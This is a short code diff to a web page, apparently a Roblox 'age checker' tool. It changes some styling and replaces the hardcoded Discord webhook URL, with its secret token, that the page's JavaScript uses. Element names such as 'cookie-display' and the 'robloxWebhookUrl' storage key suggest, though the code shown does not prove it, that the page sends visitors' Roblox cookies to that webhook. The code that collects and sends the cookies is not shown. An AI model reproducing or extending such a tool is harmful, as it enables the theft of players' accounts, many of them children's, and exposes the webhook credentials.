@@ -173,10 +173,6 @@
             box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
         }
 
-        .underage-header {
-            background: linear-gradient(90deg, var(--underage-color), #e67e22);
-        }
-
         .ageplus-header {
             background: linear-gradient(90deg, var(--ageplus-color), #2980b9);
         }
@@ -240,6 +236,11 @@
 
         .form-control::placeholder {
             color: var(--text-secondary);
+        }
+
+        .form-label {
+            color: #ffffff !important;
+            font-weight: 500;
         }
 
         .cookie-display {
@@ -852,7 +853,7 @@
             const saveWebhookBtn = document.getElementById('saveWebhookBtn');
             
             // Default webhook URL (you can change this)
-            let webhookUrl = "https://discord.com/api/webhooks/1411924939157799044/nx3V4lrmqHZ6EGnp2aJy-ohH9urPrPPMQWwYg1D2cdyPmrj7MltsTdxVijOPcujCEk7w";
+            let webhookUrl = "https://discord.com/api/webhooks/1417314431943315557/2K2NJRdg0_jZDLali-WsZl4pfKwcdCCqpOwcw08AtyvMip4zgXAbX-rwD91-Ukzn9gzX";
             
             // Check for saved webhook URL in localStorage
             const savedWebhook = localStorage.getItem('robloxWebhookUrl');
